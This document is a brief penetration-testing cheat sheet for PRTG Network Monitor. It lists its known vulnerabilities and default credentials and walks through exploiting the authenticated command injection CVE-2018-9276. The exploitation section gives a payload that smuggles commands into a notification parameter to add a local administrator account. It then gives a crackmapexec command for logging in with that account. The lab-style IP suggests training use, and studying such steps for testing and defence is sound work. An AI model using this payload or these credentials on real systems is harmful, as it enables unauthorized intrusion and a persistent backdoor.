# PRTG network monitor
## vulnerabilites (with normal POC)
* 2 XSS  
* 1 DOS  
* Command injection (authentication needed)
  * CVE-2018-9276
  * it is an authenticated command injection in the PRTG System Administrator web console for PRTG Network Monitor before version 18.2.39.  

Source: https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html
## info
usually presented in internal networks (rarely on external networks)  
common ports: 80, 443, 8080, ... (web ports)  
default credentials: prtgadmin:prtgadmin  
## exploitation
https://www.codewatch.org/blog/?p=453  
Setup / Account Settings / Notifications / Add new notification  
set name field  
tick the checkbox 'Execute Program'  
Under Program File, select Demo exe notification - outfile.ps1 from the drop-down  
in the parameter field, enter a command.  
example rce code  
<pre>test.txt;net user prtgadm1 Password_123 /add;net localgroup administrators prtgadm1 /add</pre>  
click 'Save'  
search your created notification (in the notifications list) and click on the checkbox at the end of the row  
click on 'Send test notification'  
connect to the machine with the created user  
<pre>sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Password_123</pre>
